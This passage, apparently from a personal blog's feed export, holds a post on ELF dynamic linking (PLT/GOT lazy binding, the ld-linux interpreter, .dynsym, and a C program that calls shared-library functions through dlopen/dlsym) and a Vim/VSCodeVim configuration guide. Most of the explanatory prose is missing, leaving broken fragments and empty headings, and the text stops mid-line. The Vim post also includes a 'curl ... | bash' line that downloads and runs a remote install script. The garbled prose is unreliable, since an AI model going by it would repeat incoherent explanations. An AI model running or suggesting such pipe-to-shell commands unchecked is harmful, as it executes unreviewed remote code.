alt="image-20230506014213830"></p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506014305987.png" alt="image-20230506014305987"></p><p>jmpprintf got</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506014448462.png" alt="image-20230506014448462"></p><p>id</p><p>jmp0x4003f0</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506015302033.png" alt="image-20230506015302033"></p><p>jmp0x601010_dl_runtime_resolve_xsavec</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506015707950.png" alt="image-20230506015707950"></p><p>printfgot</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506015613569.png" alt="image-20230506015613569"></p><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="interp"><a href="#interp" class="headerlink" title=".interp"></a>.interp</h3><p>interp</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -p .interp  a.out</span><br><span class="line">String dump of section &#x27;.interp&#x27;:</span><br><span class="line">  [     0]  /lib/ld-linux.so.2</span><br></pre></td></tr></table></figure><p>&#x2F;lib&#x2F;ld-linux.so.2</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; ll  /lib/ld-linux.so<span class="number">.2</span></span><br><span class="line">lrwxrwxrwx <span class="number">1</span> root root <span class="number">25</span> Apr <span class="number">22</span>  <span class="number">2021</span> /lib/ld-linux.so<span class="number">.2</span> -&gt; i386-linux-gnu/ld<span class="number">-2.23</span>.so*</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; file /lib/i386-linux-gnu/ld<span class="number">-2.23</span>.so*</span><br><span class="line">/lib/i386-linux-gnu/ld<span class="number">-2.23</span>.so: ELF <span class="number">32</span>-bit LSB shared object, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, BuildID[sha1]=<span class="number">2b</span>ea6d29e841fecacc546b9b5ab802bd061e8b29, stripped</span><br></pre></td></tr></table></figure><p>,(ldd)gotgot</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; ldd /lib/i386-linux-gnu/ld<span class="number">-2.23</span>.so*</span><br><span class="line">        statically linked</span><br></pre></td></tr></table></figure><blockquote><p>ldd</p><p>lddshell</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/D/s/i/nemu (pa1)&gt; file /usr/bin/ldd</span><br><span class="line">/usr/bin/ldd: Bourne-Again shell script, ASCII text executable</span><br></pre></td></tr></table></figure><p>ld</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">RTLDLIST=<span class="string">&quot;/lib/ld-linux.so.2 /lib64/ld-linux-x86-64.so.2 /libx32/ld-linux-x32.so.2&quot;</span></span><br></pre></td></tr></table></figure><p>ld </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">--<span class="built_in">list</span>                <span class="built_in">list</span> all dependencies and how they are resolved</span><br></pre></td></tr></table></figure><p>pie</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/D/s/i/nemu (pa1)&gt; ldd a.out</span><br><span class="line">    linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007ffde81e7000</span>)</span><br><span class="line">    libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007f68d5200000</span>)</span><br><span class="line">    /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f68d54ab000</span>)</span><br><span class="line">grxer@Ubuntu22 ~/D/s/i/nemu (pa1)&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> --<span class="built_in">list</span> ./a.out</span><br><span class="line">    linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff141e7000</span>)</span><br><span class="line">    libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007efd08400000</span>)</span><br><span class="line">    /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007efd08773000</span>)</span><br></pre></td></tr></table></figure></blockquote><p></p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506091935404.png" alt="image-20230506091935404"></p><p>dynamic.init.finit(c++)</p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/D/s/i/nemu (pa1)&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>  ./a.out</span><br><span class="line">hello     </span><br></pre></td></tr></table></figure><h3 id="-dynsym"><a href="#-dynsym" class="headerlink" title=" .dynsym"></a> .dynsym</h3><p>.symtab.dynsym.dynstr</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -s xxx.so</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.dynsym&#x27;</span> contains <span class="number">16</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND b</span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    WEAK   DEFAULT  UND __cxa_finalize@GLIBC_2<span class="number">.1</span><span class="number">.3</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">4</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     <span class="number">5</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND ext</span><br><span class="line">     <span class="number">6</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _Jv_RegisterClasses</span><br><span class="line">     <span class="number">7</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable</span><br><span class="line">     <span class="number">8</span>: <span class="number">00002018</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">22</span> _edata</span><br><span class="line">     <span class="number">9</span>: <span class="number">00000570</span>    <span class="number">50</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> bar</span><br><span class="line">    <span class="number">10</span>: <span class="number">00002020</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">23</span> x</span><br><span class="line">    <span class="number">11</span>: <span class="number">000005</span>a2    <span class="number">35</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> foo</span><br><span class="line">    <span class="number">12</span>: <span class="number">00002024</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">23</span> _end</span><br><span class="line">    <span class="number">13</span>: <span class="number">00002018</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">23</span> __bss_start</span><br><span class="line">    <span class="number">14</span>: <span class="number">000003</span>d0     <span class="number">0</span> FUNC    GLOBAL DEFAULT    <span class="number">9</span> _init</span><br><span class="line">    <span class="number">15</span>: <span class="number">000005</span>cc     <span class="number">0</span> FUNC    GLOBAL DEFAULT   <span class="number">13</span> _fini</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SETUP_STACK                                               \</span></span><br><span class="line"><span class="meta">    i = 2;                                                        \</span></span><br><span class="line"><span class="meta">    while (++i &lt; argc - 1) &#123;                                      \</span></span><br><span class="line"><span class="meta">        switch (argv[i][0]) &#123;                                     \</span></span><br><span class="line"><span class="meta">            case <span class="string">&#x27;i&#x27;</span>:                                             \</span></span><br><span class="line"><span class="meta">                asm volatile(<span class="string">&quot;push %0&quot;</span> ::<span class="string">&quot;r&quot;</span>(atoi(&amp;argv[i][1]))); \</span></span><br><span class="line"><span class="meta">                esp += 4;                                         \</span></span><br><span class="line"><span class="meta">                break;                                            \</span></span><br><span class="line"><span class="meta">            case <span class="string">&#x27;d&#x27;</span>:                                             \</span></span><br><span class="line"><span class="meta">                atof(&amp;argv[i][1]);                                \</span></span><br><span class="line"><span class="meta">                asm volatile(                                     \</span></span><br><span class="line"><span class="meta">                    <span class="string">&quot;subl $8,%esp\n&quot;</span>                              \</span></span><br><span class="line"><span class="meta">                    <span class="string">&quot;fstpl (%esp)&quot;</span>);                              \</span></span><br><span class="line"><span class="meta">                esp += 8;                                         \</span></span><br><span class="line"><span class="meta">                break;                                            \</span></span><br><span class="line"><span class="meta">            case <span class="string">&#x27;s&#x27;</span>:                                             \</span></span><br><span class="line"><span class="meta">                asm volatile(<span class="string">&quot;push %0&quot;</span> ::<span class="string">&quot;r&quot;</span>(&amp;argv[i][1]));       \</span></span><br><span class="line"><span class="meta">                esp += 4;                                         \</span></span><br><span class="line"><span class="meta">                break;                                            \</span></span><br><span class="line"><span class="meta">            default:                                              \</span></span><br><span class="line"><span class="meta">                printf(<span class="string">&quot;error argument type&quot;</span>);                    \</span></span><br><span class="line"><span class="meta">                goto exit_runso;                                  \</span></span><br><span class="line"><span class="meta">        &#125;                                                         \</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RESTORE_STACK asm volatile(<span class="string">&quot;add %0,%%esp&quot;</span> ::<span class="string">&quot;r&quot;</span>(esp))</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="type">void</span>* handle;</span><br><span class="line">    <span class="type">char</span>* error;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> esp = <span class="number">0</span>;</span><br><span class="line">    <span class="type">void</span>* func;</span><br><span class="line">    handle = dlopen(argv[<span class="number">1</span>], RTLD_NOW);</span><br><span class="line">    <span class="keyword">if</span> (handle == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t find library: %s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    func = dlsym(handle, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> ((error = dlerror()) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Find symbol %s error: %s\n&quot;</span>, argv[<span class="number">2</span>], error);</span><br><span class="line">        <span class="keyword">goto</span> exit_runso;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (argv[argc - <span class="number">1</span>][<span class="number">0</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: &#123;</span><br><span class="line">            <span class="type">int</span> (*func_int)() = func;</span><br><span class="line">            SETUP_STACK;</span><br><span class="line">            <span class="type">int</span> ret = func_int();</span><br><span class="line">            RESTORE_STACK;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: &#123;</span><br><span class="line">            <span class="type">double</span> (*func_double)() = func;</span><br><span class="line">            SETUP_STACK;</span><br><span class="line">            <span class="type">double</span> ret = func_double();</span><br><span class="line">            RESTORE_STACK;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = %f\n&quot;</span>, ret);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>: &#123;</span><br><span class="line">            <span class="type">char</span>* (*func_str)() = func;</span><br><span class="line">            SETUP_STACK;</span><br><span class="line">            <span class="type">char</span>* ret = func_str();</span><br><span class="line">            RESTORE_STACK;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = %s\n&quot;</span>, ret);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>: &#123;</span><br><span class="line">            <span class="type">void</span> (*func_void)() = func;</span><br><span class="line">            SETUP_STACK</span><br><span class="line">            <span class="title function_">func_void</span><span class="params">()</span>;</span><br><span class="line">            RESTORE_STACK;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = void&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  <span class="comment">// end of switch</span></span><br><span class="line">exit_runso:</span><br><span class="line">    dlclose(handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; gcc -m32 get.c -ldl</span><br><span class="line">get.c: In function main:</span><br><span class="line">get.c:<span class="number">8</span>:<span class="number">46</span>: warning: implicit declaration of function atoi [-Wimplicit-function-declaration]</span><br><span class="line">                 <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;push %0&quot;</span> ::<span class="string">&quot;r&quot;</span>(atoi(&amp;argv[i][<span class="number">1</span>])))</span>; \</span><br><span class="line">                                              ^</span><br><span class="line">get.c:<span class="number">47</span>:<span class="number">13</span>: note: in expansion of macro SETUP_STACK</span><br><span class="line">             SETUP_STACK;</span><br><span class="line">             ^</span><br><span class="line">get.c:<span class="number">12</span>:<span class="number">17</span>: warning: implicit declaration of function atof [-Wimplicit-function-declaration]</span><br><span class="line">                 atof(&amp;argv[i][<span class="number">1</span>]);                                \</span><br><span class="line">                 ^</span><br><span class="line">get.c:<span class="number">47</span>:<span class="number">13</span>: note: in expansion of macro SETUP_STACK</span><br><span class="line">             SETUP_STACK;</span><br><span class="line">             ^</span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; </span><br><span class="line">./a.out  /lib/i386-linux-gnu/libm<span class="number">-2.23</span>.so <span class="built_in">sin</span> d2<span class="number">.0</span> d</span><br><span class="line">ret = <span class="number">0.909297</span></span><br></pre></td></tr></table></figure><p>esp</p>]]></content>
      
      
      
        <tags>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VIM</title>
      <link href="/2023/04/30/VIM/"/>
      <url>/2023/04/30/VIM/</url>
      
        <content type="html"><![CDATA[<h1 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h1><p>vimvimidevimvim vsc jetideavimvs2022 vimClion,clionvs2022</p><h2 id="VSCODE-vim"><a href="#VSCODE-vim" class="headerlink" title="VSCODE vim"></a>VSCODE vim</h2><h3 id="nomal"><a href="#nomal" class="headerlink" title="nomal"></a>nomal</h3><p>a A A;</p><p>i I</p><p>o O</p><p>f {char}char F{char} </p><p>;   , .</p><p>d () c y p u </p><p>xr</p><p>&#x3D;&#x3D;</p><p><em> Ctrl-u </em></p><p><em> Ctrl-d </em></p><p><em> Ctrl-b </em></p><p><em> Ctrl-f </em></p><p><em> gg </em></p><p><em> G </em></p><p><em> H </em> head</p><p><em> M  middle</em></p><p><em> L  last</em></p><p>ayy a</p><p>Ayy a.</p><p>ap a</p><p><num> j<num> knum</num></num></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><img src="/2023/04/30/VIM/image-20230430152911270.png" alt="image-20230430152911270"></p><p>w </p><p>b (back)</p><p>e (end)</p><p>0  ^ $</p><p>gg  G</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>aaround iinner :() &lt;&gt; {} </p><p>c&#x2F;d&#x2F;y iw</p><p>c&#x2F;d&#x2F;y i </p><p>c&#x2F;d&#x2F;y a </p><p>{}c&#x2F;d&#x2F;y iBc&#x2F;d&#x2F;y aB</p><p>()c&#x2F;d&#x2F;y ibc&#x2F;d&#x2F;y ab</p><p>dd yy cc n</p><p>c&#x2F;d&#x2F;y f {char}char</p><p>c&#x2F;d&#x2F;y ia e</p><p>de</p><h3 id="VISUAL"><a href="#VISUAL" class="headerlink" title="VISUAL"></a>VISUAL</h3><p></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>gd  (goto defination)</p><p>gh  (hover)</p><p>ctrl+r:redo</p><p>:tabng t(next) :tabp g T(prev)</p><p>JK</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;vim.easymotion&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.incsearch&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.useSystemClipboard&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.useCtrlKeys&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.hlsearch&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.sneak&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.insertModeKeyBindings&quot;</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [<span class="string">&quot;j&quot;</span>, <span class="string">&quot;k&quot;</span>],</span><br><span class="line">    <span class="string">&quot;after&quot;</span>: [<span class="string">&quot;&lt;Esc&gt;&quot;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">&quot;vim.normalModeKeyBindingsNonRecursive&quot;</span>: [</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [<span class="string">&quot;&lt;leader&gt;&quot;</span>, <span class="string">&quot;d&quot;</span>],</span><br><span class="line">    <span class="string">&quot;after&quot;</span>: [<span class="string">&quot;d&quot;</span>, <span class="string">&quot;d&quot;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [<span class="string">&quot;&lt;C-n&gt;&quot;</span>],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [<span class="string">&quot;:nohl&quot;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [<span class="string">&quot;K&quot;</span>],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [<span class="string">&quot;lineBreakInsert&quot;</span>],</span><br><span class="line">    <span class="string">&quot;silent&quot;</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [<span class="string">&quot;&lt;S-K&gt;&quot;</span>],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [<span class="string">&quot;:tabnext&quot;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [<span class="string">&quot;&lt;S-J&gt;&quot;</span>],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [<span class="string">&quot;:tabprevious&quot;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [<span class="string">&quot;&lt;S-Q&gt;&quot;</span>],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [<span class="string">&quot;:q!&quot;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">&quot;vim.leader&quot;</span>: <span class="string">&quot;&lt;space&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;vim.handleKeys&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;&lt;C-a&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-f&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-z&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-v&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-c&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-x&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-w&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&quot;vim.highlightedyank.enable&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.showMarksInGutter&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.smartRelativeLine&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.sneakReplacesF&quot;</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>ctrl octrl + i</p><p>gcc gc3j4 gciB gcaB</p><table><thead><tr><th><code>y s &lt;motion&gt; &lt;desired&gt;</code></th><th>Add <code>desired</code> surround around text defined by <code>&lt;motion&gt;</code></th></tr></thead><tbody><tr><td><code>d s &lt;existing&gt;</code></td><td>Delete <code>existing</code> surround</td></tr><tr><td><code>c s &lt;existing&gt; &lt;desired&gt;</code></td><td>Change <code>existing</code> surround to <code>desired</code></td></tr></tbody></table><table><thead><tr><th><code>S &lt;desired&gt;</code></th><th>Surround when in visual modes (surrounds full selection)</th></tr></thead><tbody><tr><td></td><td>vaw S </td></tr></tbody></table><p> vim.sneak: true s<char><char>char char</char></char></p><p>S<char><char>char charsrb cwciw</char></char></p><p><a href="https://github.com/VSCodeVim/Vim">https://github.com/VSCodeVim/Vim</a> </p><h2 id="VIM-1"><a href="#VIM-1" class="headerlink" title="VIM"></a>VIM</h2><p>~&#x2F;.vimrc</p><p><a href="https://vimawesome.com/">https://vimawesome.com/</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.vim/autoload/plug.vim --create-dirs \</span><br><span class="line">    https:<span class="comment">//raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span></span><br></pre></td></tr></table></figure><p>cocnvim <a href="https://github.com/neoclide/coc.nvim">https://github.com/neoclide/coc.nvim</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nodejs &gt;= <span class="number">14.14</span></span><br><span class="line">curl -o- https:<span class="comment">//raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash</span></span><br><span class="line"> zsh  fish bash  zsh  fish</span><br><span class="line">nvm install <span class="number">16</span>    </span><br><span class="line">nvm use <span class="number">16</span></span><br></pre></td></tr></table></figure><p> <a href="https://github.com/neoclide/coc.nvim/wiki/Using-coc-extensions">https://github.com/neoclide/coc.nvim/wiki/Using-coc-extensions</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt install clangd</span><br><span class="line">sudo apt install clang-format</span><br><span class="line">:CocInstall coc-clangd</span><br><span class="line">:CocInstall coc-pyright</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">set hlsearch</span></span><br><span class="line"><span class="string">&quot;</span><span class="built_in">set</span><span class="built_in">set</span></span><br><span class="line"><span class="built_in">set</span> smartcase</span><br><span class="line"><span class="string">&quot;5</span></span><br><span class="line"><span class="string">set scrolloff=5</span></span><br><span class="line"><span class="string">set clipboard=unnamedplus</span></span><br><span class="line"><span class="string">set t_Co=256</span></span><br><span class="line"><span class="string">&quot;</span> <span class="built_in">set</span> hlsearch</span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="built_in">set</span> cursorline</span><br><span class="line"><span class="built_in">set</span> number             <span class="string">&quot; Enable line numbering</span></span><br><span class="line"><span class="string">augroup numbertoggle   &quot;</span> Toggles relativenumber on and off based on mode</span><br><span class="line">    autocmd!</span><br><span class="line">    autocmd BufEnter,FocusGained,InsertLeave * <span class="built_in">set</span> relativenumber</span><br><span class="line">    autocmd BufLeave,FocusLost,InsertEnter   * <span class="built_in">set</span> norelativenumber</span><br><span class="line">augroup END</span><br><span class="line"><span class="built_in">set</span> mouse=a</span><br><span class="line"><span class="string">&quot; add tab space</span></span><br><span class="line"><span class="string">set ts=4</span></span><br><span class="line"><span class="string">set softtabstop=4</span></span><br><span class="line"><span class="string">set shiftwidth=4</span></span><br><span class="line"><span class="string">set expandtab</span></span><br><span class="line"><span class="string">set cindent</span></span><br><span class="line"><span class="string">set autoindent</span></span><br><span class="line"><span class="string">inoremap jk  &lt;ESC&gt;</span></span><br><span class="line"><span class="string">nnoremap &lt;s-k&gt; gt</span></span><br><span class="line"><span class="string">nnoremap &lt;s-J&gt; gT</span></span><br><span class="line"><span class="string">nnoremap &lt;S-q&gt; :q!&lt;CR&gt;</span></span><br><span class="line"><span class="string">set incsearch</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">call plug#begin()</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">Plug <span class="string">&#x27;voldikss/vim-floaterm&#x27;</span></span><br><span class="line">let g:floaterm_keymap_toggle = <span class="string">&#x27;jt&#x27;</span></span><br><span class="line">let g:floaterm_keymap_new    = <span class="string">&#x27;&lt;F7&gt;&#x27;</span></span><br><span class="line">let g:floaterm_keymap_prev   = <span class="string">&#x27;&lt;F8&gt;&#x27;</span></span><br><span class="line">let g:floaterm_keymap_next   = <span class="string">&#x27;&lt;F9&gt;&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">Plug &#x27;mg979/vim-visual-multi&#x27;, &#123;&#x27;branch&#x27;: &#x27;master&#x27;&#125;</span></span><br><span class="line"><span class="string">let g:VM_maps                       = &#123;&#125;</span></span><br><span class="line"><span class="string">let g:VM_maps[&#x27;Find Under&#x27;]         = &#x27;&lt;C-j&gt;&#x27;</span></span><br><span class="line"><span class="string">let g:VM_maps[&#x27;Find Subword Under&#x27;] = &#x27;&lt;C-j&gt;&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">Plug <span class="string">&#x27;mhinz/vim-startify&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">Plug &#x27;vim-airline/vim-airline&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">Plug <span class="string">&#x27;jiangmiao/auto-pairs&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">Plug &#x27;luochen1990/rainbow&#x27;</span></span><br><span class="line"><span class="string">let g:rainbow_active = 1</span></span><br><span class="line"><span class="string">Plug &#x27;preservim/nerdtree&#x27;</span></span><br><span class="line"><span class="string">map &lt;C-n&gt; :NERDTreeToggle&lt;CR&gt;</span></span><br><span class="line"><span class="string">&quot;</span>vim-sneak</span><br><span class="line">Plug <span class="string">&#x27;justinmk/vim-sneak&#x27;</span></span><br><span class="line">let g:sneak<span class="meta">#label = 1</span></span><br><span class="line"><span class="string">&quot;vim-surround</span></span><br><span class="line"><span class="string">Plug &#x27;tpope/vim-surround&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>vim-commentary</span><br><span class="line">Plug <span class="string">&#x27;tpope/vim-commentary&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;theme</span></span><br><span class="line"><span class="string">Plug &#x27;joshdick/onedark.vim&#x27;</span></span><br><span class="line"><span class="string">Plug &#x27;sainnhe/edge&#x27;</span></span><br><span class="line"><span class="string">Plug &#x27;rakr/vim-one&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>coc.nvim</span><br><span class="line">Plug <span class="string">&#x27;neoclide/coc.nvim&#x27;</span>, &#123;<span class="string">&#x27;branch&#x27;</span>: <span class="string">&#x27;release&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">Plug <span class="string">&#x27;easymotion/vim-easymotion&#x27;</span></span><br><span class="line"><span class="string">&quot;  nvimpython</span></span><br><span class="line"><span class="string">Plug &#x27;vim-autoformat/vim-autoformat&#x27;</span></span><br><span class="line"><span class="string">Plug &#x27;vim-scripts/argtextobj.vim&#x27;</span></span><br><span class="line"><span class="string">call plug#end()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot; clang-format -style=google -dump-config &gt; .clang-format </span></span><br><span class="line"><span class="string">&quot;</span>  .clang-format </span><br><span class="line">augroup copy_clang_format</span><br><span class="line">  autocmd!</span><br><span class="line">  autocmd BufNewFile,BufRead *.c,*.cpp execute <span class="string">&#x27;silent! !cp /home/grxer/.clang-format &#x27;</span> . expand(<span class="string">&#x27;%:p:h&#x27;</span>) . <span class="string">&#x27;/.clang-format&#x27;</span></span><br><span class="line">augroup END</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;f4</span></span><br><span class="line"><span class="string">noremap 